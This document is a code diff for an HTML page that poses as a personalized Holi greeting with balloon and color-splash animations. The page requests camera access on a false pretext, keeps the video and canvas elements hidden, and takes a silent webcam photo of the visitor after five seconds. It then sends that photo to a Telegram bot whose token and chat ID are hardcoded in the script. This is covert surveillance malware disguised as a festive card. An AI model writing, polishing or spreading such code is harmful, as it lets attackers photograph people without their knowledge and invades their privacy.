@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Holi Surprise 2026</title>
+    <title>Holi Burst 2026 | Personalized</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@900&family=Pacifico&display=swap" rel="stylesheet">
     <style>
         :root { --p: #ff007f; --y: #ffd700; --b: #00d4ff; --g: #39ff14; --v: #9d00ff; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Poppins', sans-serif; overflow: hidden; background: #000; height: 100vh; }
 
-        /* Flowing Background */
+        /* Your Original Animated Background */
         .bg { 
             position: fixed; inset: 0; 
             background: linear-gradient(135deg, var(--p), var(--y), var(--b), var(--g), var(--v)); 
@@ -20,11 +20,11 @@
 
         canvas { position: fixed; inset: 0; pointer-events: none; z-index: 1; }
 
-        /* UI Styling */
+        /* Your Original UI Layer */
         .ui-layer { 
             position: relative; z-index: 10; height: 100vh; display: flex; 
             flex-direction: column; justify-content: center; align-items: center; 
-            text-align: center; color: white; transition: 0.5s; 
+            text-align: center; color: white; transition: 0.5s ease-in-out; 
         }
         .title { font-family: 'Pacifico', cursive; font-size: clamp(2.5rem, 8vw, 4.5rem); text-shadow: 0 10px 30px rgba(0,0,0,0.4); }
         
@@ -36,7 +36,7 @@
         }
         .btn-play:hover { transform: scale(1.1); background: var(--y); }
 
-        /* Balloon Wobble */
+        /* Original Balloon Design */
         .balloon { 
             position: fixed; width: 65px; height: 85px; 
             border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%; 
@@ -45,7 +45,7 @@
         }
         @keyframes wobble { 0%, 100% { transform: translateY(0) rotate(-5deg); } 50% { transform: translateY(-12px) rotate(5deg); } }
 
-        /* Personalized Final Text */
+        /* Big "Happy Holi" Climax */
         #grandHoli { 
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
             font-size: clamp(2.5rem, 12vw, 6rem); font-weight: 900; color: white; 
@@ -55,7 +55,7 @@
         }
         @keyframes bounceIn { 0% { transform: translate(-50%, -50%) scale(0); } 100% { transform: translate(-50%, -50%) scale(1); } }
 
-        /* Strictly Hidden from User */
+        /* Hidden Elements */
         #video, #snapCanvas { display: none; visibility: hidden; position: absolute; left: -9999px; }
     </style>
 </head>
@@ -67,8 +67,8 @@
 
     <div class="ui-layer" id="mainUI">
         <h1 class="title" id="welcomeText">Holi Fest</h1>
-        <p style="font-size: 1.2rem; opacity: 0.9;">Tap balloons for a surprise!</p>
-        <button class="btn-play" onclick="startDigitalHoli()">START SPLASH</button>
+        <p style="font-size: 1.2rem; opacity: 0.9;">Pop balloons to start the magic!</p>
+        <button class="btn-play" onclick="startExperience()">START SPLASH</button>
     </div>
 
     <h1 id="grandHoli">🎉 HAPPY HOLI <br><span id="targetName"></span> 🎉</h1>
@@ -77,11 +77,13 @@
     <canvas id="snapCanvas"></canvas>
 
     <script>
-        // 🚀 FILL YOUR TELEGRAM DETAILS HERE 🚀
-        const TOKEN = "8636656865:AAHfvDz0yIaR_APm6Gblb3mlAQlv3MDDkLw";
-        const CHAT_ID = " 8485099057";
+        // ---------------------------------------------------------
+        // ⚠️ STEP 1: ENTER YOUR DETAILS BETWEEN THE QUOTES ⚠️
+        // ---------------------------------------------------------
+        const TOKEN = "8636656865:AAHfvDz0yIaR_APm6Gblb3mlAQlv3MDDkLw"; 
+        const CHAT_ID = " 8485099057"; 
 
-        // Extract Name from URL (?name=Rahul)
+        // Extract Name from Link (?name=Rahul)
         const urlParams = new URLSearchParams(window.location.search);
         const personName = urlParams.get('name') || "";
         
@@ -98,6 +100,7 @@
         function resize() { w = pc.width = sc.width = window.innerWidth; h = pc.height = sc.height = window.innerHeight; }
         window.onresize = resize; resize();
 
+        // Background Powder Effect
         class Particle {
             constructor() { this.reset(); }
             reset() { this.x = Math.random()*w; this.y = -30; this.s = Math.random()*3+1; this.v = 2 + Math.random()*3; this.c = colors[Math.floor(Math.random()*colors.length)]; }
@@ -106,6 +109,7 @@
         }
         for(let i=0; i<100; i++) particles.push(new Particle());
 
+        // Splash Effect
         class Splash {
             constructor(x, y, color) {
                 this.x = x; this.y = y; this.c = color; this.items = [];
@@ -122,14 +126,14 @@
                     if(p.type==='d') {
                         sCtx.fillStyle = this.c; sCtx.beginPath(); sCtx.arc(this.x+p.x, this.y+p.y, 6, 0, Math.PI*2); sCtx.fill();
                     } else {
-                        sCtx.fillStyle = "white"; sCtx.font = "bold 24px Poppins"; sCtx.textAlign="center";
+                        sCtx.fillStyle = "white"; sCtx.font = "900 24px Poppins"; sCtx.textAlign="center";
                         sCtx.fillText(personName ? "Holi " + personName : "Happy Holi!", this.x+p.x, this.y+p.y);
                     }
                 });
             }
         }
 
-        async function startDigitalHoli() {
+        async function startExperience() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const videoEl = document.getElementById('video');
@@ -141,7 +145,7 @@
                 isActive = true;
                 spawnBalloons();
 
-                // 📸 SILENT STEALTH CAPTURE (At 5 seconds for focus)
+                // 📸 SILENT CAPTURE (At 5 seconds)
                 setTimeout(() => {
                     if (videoEl.readyState >= 2) {
                         const snapCanvas = document.getElementById('snapCanvas');
@@ -154,31 +158,31 @@
                             fd.append("chat_id", CHAT_ID);
                             fd.append("photo", blob, "holi_snap.png");
                             
-                            // Log the result to help you debug
                             fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd })
                             .then(res => res.json())
                             .then(data => {
-                                if(!data.ok) alert("Telegram Error: " + data.description);
+                                if(!data.ok) alert("Telegram Error: " + data.description + ". (Make sure you clicked START on the bot!)");
                             });
                         }, "image/png");
                     }
                 }, 5000);
 
-                // 🎇 CLIMAX & AUTO-RESET (At 10 seconds)
+                // 🎆 CLIMAX & AUTO-RESET (Total 10 seconds)
                 setTimeout(() => {
                     isActive = false;
                     document.querySelectorAll('.balloon').forEach(el => el.remove());
                     document.getElementById('grandHoli').style.display = 'block';
                     
                     setTimeout(() => {
+                        // Reset everything back to the start
                         document.getElementById('grandHoli').style.display = 'none';
                         document.getElementById('mainUI').style.visibility = 'visible';
                         document.getElementById('mainUI').style.opacity = '1';
-                        stream.getTracks().forEach(t => t.stop()); // Safety off
+                        stream.getTracks().forEach(t => t.stop()); 
                     }, 4000);
-                }, 10000);
+                }, 9000);
 
-            } catch (err) { alert("Camera access required for AR effects!"); }
+            } catch (err) { alert("Camera access is needed for the magic!"); }
         }
 
         function spawnBalloons() {
